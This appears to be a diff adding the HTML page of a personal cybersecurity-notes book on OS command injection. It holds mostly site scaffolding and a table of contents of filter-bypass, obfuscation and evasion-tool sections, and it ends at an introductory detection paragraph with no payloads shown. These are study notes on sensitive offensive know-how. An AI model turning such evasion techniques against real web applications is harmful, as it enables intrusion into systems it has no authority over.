@@ -1,0 +1,965 @@
+<!DOCTYPE HTML>
+<html lang="en" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>Command Injections - Cybersecurity Notes</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../../favicon.png">
+        <link rel="stylesheet" href="../../../../css/variables.css">
+        <link rel="stylesheet" href="../../../../css/general.css">
+        <link rel="stylesheet" href="../../../../css/chrome.css">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" id="highlight-css" href="../../../../highlight.css">
+        <link rel="stylesheet" id="tomorrow-night-css" href="../../../../tomorrow-night.css">
+        <link rel="stylesheet" id="ayu-highlight-css" href="../../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+        <link rel="stylesheet" href="../../../../theme/pagetoc.css">
+
+
+        <!-- Provide site root and default themes to javascript -->
+        <script>
+            const path_to_root = "../../../../";
+            const default_light_theme = "light";
+            const default_dark_theme = "navy";
+            window.path_to_searchindex_js = "../../../../searchindex.js";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="mdbook-help-container">
+        <div id="mdbook-help-popup">
+            <h2 class="mdbook-help-title">Keyboard shortcuts</h2>
+            <div>
+                <p>Press <kbd>←</kbd> or <kbd>→</kbd> to navigate between chapters</p>
+                <p>Press <kbd>S</kbd> or <kbd>/</kbd> to search in the book</p>
+                <p>Press <kbd>?</kbd> to show this help</p>
+                <p>Press <kbd>Esc</kbd> to hide this help</p>
+            </div>
+        </div>
+    </div>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                let theme = localStorage.getItem('mdbook-theme');
+                let sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            const default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? default_dark_theme : default_light_theme;
+            let theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            let sidebar = null;
+            const sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+                sidebar_toggle.checked = false;
+            }
+            if (sidebar === 'visible') {
+                sidebar_toggle.checked = true;
+            } else {
+                html.classList.remove('sidebar-visible');
+            }
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="default_theme">Auto</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search (`/`)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="/ s" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title">Cybersecurity Notes</h1>
+
+                    <div class="right-buttons">
+                        <a href="https://github.com/d41y/d41y.github.io" title="Git repository" aria-label="Git repository">
+                            <i id="git-repository-button" class="fa fa-github"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <div class="search-wrapper">
+                            <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                            <div class="spinner-wrapper">
+                                <i class="fa fa-spinner fa-spin"></i>
+                            </div>
+                        </div>
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <style>
+.mdbook-callouts {
+  padding: 8px 16px;
+  margin-bottom: 16px;
+  border-radius: 4px;
+  /* border-left: 0.25em solid var(--mdbook-callouts-color); */
+  background: var(--mdbook-callouts-background);
+}
+
+.mdbook-callouts > *:first-child {
+  margin-top: 0;
+}
+
+.mdbook-callouts > *:last-child {
+  margin-bottom: 0;
+}
+
+.mdbook-callouts-title {
+  display: flex;
+  font-weight: 600;
+  align-items: center;
+  line-height: 1;
+  color: var(--mdbook-callouts-color);
+  text-transform: capitalize;
+}
+
+.mdbook-callouts-icon {
+  display: inline-block;
+  width: 1em;
+  height: 1em;
+  margin-right: 0.2em;
+  background-color: currentColor;
+  -webkit-mask: no-repeat center / 100%;
+  mask: no-repeat center / 100%;
+  -webkit-mask-image: var(--mdbook-callouts-icon);
+  mask-image: var(--mdbook-callouts-icon);
+}
+
+/* icons at: https://lucide.dev/icons/ */
+
+.mdbook-callouts-info {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/info */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWluZm8iPjxjaXJjbGUgY3g9IjEyIiBjeT0iMTIiIHI9IjEwIi8+PHBhdGggZD0iTTEyIDE2di00Ii8+PHBhdGggZD0iTTEyIDhoLjAxIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-note {
+  --mdbook-callouts-color: rgb(var(--color-blue-rgb));
+  --mdbook-callouts-background: rgba(var(--color-blue-rgb), 0.1);
+  /* https://lucide.dev/icons/pencil */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXBlbmNpbCI+PHBhdGggZD0iTTE3IDNhMi44NSAyLjgzIDAgMSAxIDQgNEw3LjUgMjAuNSAyIDIybDEuNS01LjVaIi8+PHBhdGggZD0ibTE1IDUgNCA0Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-tip,
+.mdbook-callouts-hint {
+  --mdbook-callouts-color: rgb(var(--color-cyan-rgb));
+  --mdbook-callouts-background: rgba(var(--color-cyan-rgb), 0.1);
+  /* https://lucide.dev/icons/flame */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWZsYW1lIj48cGF0aCBkPSJNOC41IDE0LjVBMi41IDIuNSAwIDAgMCAxMSAxMmMwLTEuMzgtLjUtMi0xLTMtMS4wNzItMi4xNDMtLjIyNC00LjA1NCAyLTYgLjUgMi41IDIgNC45IDQgNi41IDIgMS42IDMgMy41IDMgNS41YTcgNyAwIDEgMS0xNCAwYzAtMS4xNTMuNDMzLTIuMjk0IDEtM2EyLjUgMi41IDAgMCAwIDIuNSAyLjV6Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-important {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LWNpcmNsZSI+PGNpcmNsZSBjeD0iMTIiIGN5PSIxMiIgcj0iMTAiLz48bGluZSB4MT0iMTIiIHgyPSIxMiIgeTE9IjgiIHkyPSIxMiIvPjxsaW5lIHgxPSIxMiIgeDI9IjEyLjAxIiB5MT0iMTYiIHkyPSIxNiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-success,
+.mdbook-callouts-check,
+.mdbook-callouts-done {
+  --mdbook-callouts-color: rgb(var(--color-green-rgb));
+  --mdbook-callouts-background: rgba(var(--color-green-rgb), 0.1);
+  /* https://lucide.dev/icons/check */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWNoZWNrIj48cGF0aCBkPSJNMjAgNiA5IDE3bC01LTUiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-question,
+.mdbook-callouts-help,
+.mdbook-callouts-faq {
+  --mdbook-callouts-color: rgb(var(--color-pink-rgb));
+  --mdbook-callouts-background: rgba(var(--color-pink-rgb), 0.1);
+  /* https://lucide.dev/icons/help-circle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWhlbHAtY2lyY2xlIj48Y2lyY2xlIGN4PSIxMiIgY3k9IjEyIiByPSIxMCIvPjxwYXRoIGQ9Ik05LjA5IDlhMyAzIDAgMCAxIDUuODMgMWMwIDItMyAzLTMgMyIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-warning,
+.mdbook-callouts-warn {
+  --mdbook-callouts-color: rgb(var(--color-orange-rgb));
+  --mdbook-callouts-background: rgba(var(--color-orange-rgb), 0.1);
+  /* https://lucide.dev/icons/alert-triangle */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWFsZXJ0LXRyaWFuZ2xlIj48cGF0aCBkPSJtMjEuNzMgMTgtOC0xNGEyIDIgMCAwIDAtMy40OCAwbC04IDE0QTIgMiAwIDAgMCA0IDIxaDE2YTIgMiAwIDAgMCAxLjczLTNaIi8+PHBhdGggZD0iTTEyIDl2NCIvPjxwYXRoIGQ9Ik0xMiAxN2guMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-caution {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/shield-alert */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXNoaWVsZC1hbGVydCI+PHBhdGggZD0iTTEyIDIyczgtNCA4LTEwVjVsLTgtMy04IDN2N2MwIDYgOCAxMCA4IDEwIi8+PHBhdGggZD0iTTEyIDh2NCIvPjxwYXRoIGQ9Ik0xMiAxNmguMDEiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-failure,
+.mdbook-callouts-fail,
+.mdbook-callouts-missing {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/x */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXgiPjxwYXRoIGQ9Ik0xOCA2IDYgMTgiLz48cGF0aCBkPSJtNiA2IDEyIDEyIi8+PC9zdmc+');
+}
+
+.mdbook-callouts-error,
+.mdbook-callouts-danger {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/zap */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXphcCI+PHBvbHlnb24gcG9pbnRzPSIxMyAyIDMgMTQgMTIgMTQgMTEgMjIgMjEgMTAgMTIgMTAgMTMgMiIvPjwvc3ZnPg==');
+}
+
+.mdbook-callouts-bug {
+  --mdbook-callouts-color: rgb(var(--color-red-rgb));
+  --mdbook-callouts-background: rgba(var(--color-red-rgb), 0.1);
+  /* https://lucide.dev/icons/bug */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWJ1ZyI+PHBhdGggZD0ibTggMiAxLjg4IDEuODgiLz48cGF0aCBkPSJNMTQuMTIgMy44OCAxNiAyIi8+PHBhdGggZD0iTTkgNy4xM3YtMWEzLjAwMyAzLjAwMyAwIDEgMSA2IDB2MSIvPjxwYXRoIGQ9Ik0xMiAyMGMtMy4zIDAtNi0yLjctNi02di0zYTQgNCAwIDAgMSA0LTRoNGE0IDQgMCAwIDEgNCA0djNjMCAzLjMtMi43IDYtNiA2Ii8+PHBhdGggZD0iTTEyIDIwdi05Ii8+PHBhdGggZD0iTTYuNTMgOUM0LjYgOC44IDMgNy4xIDMgNSIvPjxwYXRoIGQ9Ik02IDEzSDIiLz48cGF0aCBkPSJNMyAyMWMwLTIuMSAxLjctMy45IDMuOC00Ii8+PHBhdGggZD0iTTIwLjk3IDVjMCAyLjEtMS42IDMuOC0zLjUgNCIvPjxwYXRoIGQ9Ik0yMiAxM2gtNCIvPjxwYXRoIGQ9Ik0xNy4yIDE3YzIuMS4xIDMuOCAxLjkgMy44IDQiLz48L3N2Zz4=');
+}
+
+.mdbook-callouts-examples,
+.mdbook-callouts-example {
+  --mdbook-callouts-color: rgb(var(--color-purple-rgb));
+  --mdbook-callouts-background: rgba(var(--color-purple-rgb), 0.1);
+  /* https://lucide.dev/icons/list */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLWxpc3QiPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSI4IiB4Mj0iMjEiIHkxPSIxMiIgeTI9IjEyIi8+PGxpbmUgeDE9IjgiIHgyPSIyMSIgeTE9IjE4IiB5Mj0iMTgiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSI2IiB5Mj0iNiIvPjxsaW5lIHgxPSIzIiB4Mj0iMy4wMSIgeTE9IjEyIiB5Mj0iMTIiLz48bGluZSB4MT0iMyIgeDI9IjMuMDEiIHkxPSIxOCIgeTI9IjE4Ii8+PC9zdmc+');
+}
+
+.mdbook-callouts-quote {
+  --mdbook-callouts-color: rgb(158, 158, 158);
+  --mdbook-callouts-background: rgba(158, 158, 158, 0.1);
+  /* https://lucide.dev/icons/quote */
+  --mdbook-callouts-icon: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyNCIgaGVpZ2h0PSIyNCIgdmlld0JveD0iMCAwIDI0IDI0IiBmaWxsPSJub25lIiBzdHJva2U9ImN1cnJlbnRDb2xvciIgc3Ryb2tlLXdpZHRoPSIyIiBzdHJva2UtbGluZWNhcD0icm91bmQiIHN0cm9rZS1saW5lam9pbj0icm91bmQiIGNsYXNzPSJsdWNpZGUgbHVjaWRlLXF1b3RlIj48cGF0aCBkPSJNMyAyMWMzIDAgNy0xIDctOFY1YzAtMS4yNS0uNzU2LTIuMDE3LTItMkg0Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDIgMSAwIDEgMCAxIDF2MWMwIDEtMSAyLTIgMnMtMSAuMDA4LTEgMS4wMzFWMjBjMCAxIDAgMSAxIDF6Ii8+PHBhdGggZD0iTTE1IDIxYzMgMCA3LTEgNy04VjVjMC0xLjI1LS43NTctMi4wMTctMi0yaC00Yy0xLjI1IDAtMiAuNzUtMiAxLjk3MlYxMWMwIDEuMjUuNzUgMiAyIDJoLjc1YzAgMi4yNS4yNSA0LTIuNzUgNHYzYzAgMSAwIDEgMSAxeiIvPjwvc3ZnPg==');
+}
+
+
+.ayu {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.light {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+
+.coal {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.navy {
+  --color-red-rgb: 251, 70, 76;
+  --color-red: #fb464c;
+  --color-orange-rgb: 233, 151, 63;
+  --color-orange: #e9973f;
+  --color-yellow-rgb: 224, 222, 113;
+  --color-yellow: #e0de71;
+  --color-green-rgb: 68, 207, 110;
+  --color-green: #44cf6e;
+  --color-cyan-rgb: 83, 223, 221;
+  --color-cyan: #53dfdd;
+  --color-blue-rgb: 2, 122, 255;
+  --color-blue: #027aff;
+  --color-purple-rgb: 168, 130, 255;
+  --color-purple: #a882ff;
+  --color-pink-rgb: 250, 153, 205;
+  --color-pink: #fa99cd;
+}
+
+.rust {
+  --color-red-rgb: 233, 49, 71;
+  --color-red: #e93147;
+  --color-orange-rgb: 236, 117, 0;
+  --color-orange: #ec7500;
+  --color-yellow-rgb: 224, 172, 0;
+  --color-yellow: #e0ac00;
+  --color-green-rgb: 8, 185, 78;
+  --color-green: #08b94e;
+  --color-cyan-rgb: 0, 191, 188;
+  --color-cyan: #00bfbc;
+  --color-blue-rgb: 8, 109, 221;
+  --color-blue: #086ddd;
+  --color-purple-rgb: 120, 82, 238;
+  --color-purple: #7852ee;
+  --color-pink-rgb: 213, 57, 132;
+  --color-pink: #d53984;
+}
+</style>
+<ul>
+<li><a href="#command-injections">Command Injections</a>
+<ul>
+<li><a href="#detection">Detection</a>
+<ul>
+<li><a href="#command-injection-detection">Command Injection Detection</a></li>
+<li><a href="#command-injection-methods">Command Injection Methods</a></li>
+</ul>
+</li>
+<li><a href="#injecting-commands">Injecting Commands</a>
+<ul>
+<li><a href="#injecting-your-command">Injecting your Command</a></li>
+<li><a href="#bypassing-front-end-validation">Bypassing Front-End Validation</a></li>
+</ul>
+</li>
+<li><a href="#other-injection-operators">Other Injection Operators</a>
+<ul>
+<li><a href="#and-operator">AND Operator</a></li>
+<li><a href="#or-operator">OR Operator</a></li>
+</ul>
+</li>
+<li><a href="#identifying-filters">Identifying Filters</a>
+<ul>
+<li><a href="#filterwaf-detection">Filter/WAF Detection</a></li>
+<li><a href="#blacklisted-characters">Blacklisted Characters</a>
+<ul>
+<li><a href="#identifying-blacklisted-character">Identifying Blacklisted Character</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#bypassing-space-filters">Bypassing Space Filters</a>
+<ul>
+<li><a href="#using-tabs">Using Tabs</a></li>
+<li><a href="#using-ifs">Using $IFS</a></li>
+<li><a href="#using-brace-expansion">Using Brace Expansion</a></li>
+</ul>
+</li>
+<li><a href="#bypassing-other-blacklisted-characters">Bypassing Other Blacklisted Characters</a>
+<ul>
+<li><a href="#linux">Linux</a></li>
+<li><a href="#windows">Windows</a></li>
+<li><a href="#character-shifting">Character Shifting</a></li>
+</ul>
+</li>
+<li><a href="#bypassing-blacklisted-commands">Bypassing Blacklisted Commands</a>
+<ul>
+<li><a href="#commands-blacklist">Commands Blacklist</a></li>
+<li><a href="#linux--windows">Linux &amp; Windows</a></li>
+<li><a href="#linux-only">Linux Only</a></li>
+<li><a href="#windows-only">Windows Only</a></li>
+</ul>
+</li>
+<li><a href="#advanced-command-obfuscation">Advanced Command Obfuscation</a>
+<ul>
+<li><a href="#case-manipulation">Case Manipulation</a></li>
+<li><a href="#reversed-commands">Reversed Commands</a>
+<ul>
+<li><a href="#linux-1">Linux</a></li>
+<li><a href="#windows-1">Windows</a></li>
+</ul>
+</li>
+<li><a href="#encoded-commands">Encoded Commands</a>
+<ul>
+<li><a href="#linux-2">Linux</a></li>
+<li><a href="#windows-2">Windows</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#evasion-tools">Evasion Tools</a>
+<ul>
+<li><a href="#linux-bashfuscator">Linux (Bashfuscator)</a></li>
+<li><a href="#windows-dosfucation">Windows (DOSfucation)</a></li>
+</ul>
+</li>
+<li><a href="#command-injection-prevention">Command Injection Prevention</a>
+<ul>
+<li><a href="#system-commands">System Commands</a></li>
+<li><a href="#input-validation">Input Validation</a></li>
+<li><a href="#input-sanitization">Input Sanitization</a></li>
+<li><a href="#server-configuration">Server Configuration</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<hr />
+<h1 id="command-injections"><a class="header" href="#command-injections">Command Injections</a></h1>
+<p>When it comes to OS Command Injections, the user input you control must directly or indirectly go into a web query that executes system commands. All web programming languages have different functions that enable the developer to execute operating system commands directly on the back-end server whenever they need to. This may be used for various purposes, like installing plugins or executing certain plugins.</p>
+<h2 id="detection"><a class="header" href="#detection">Detection</a></h2>
+<h3 id="command-injection-detection"><a class="header" href="#command-injection-detection">Command Injection Detection</a></h3>
+<p>When you visit the web application, you see a "Host Checker" utility that appears to ask you for an IP to check whether it is alive or not.</p>
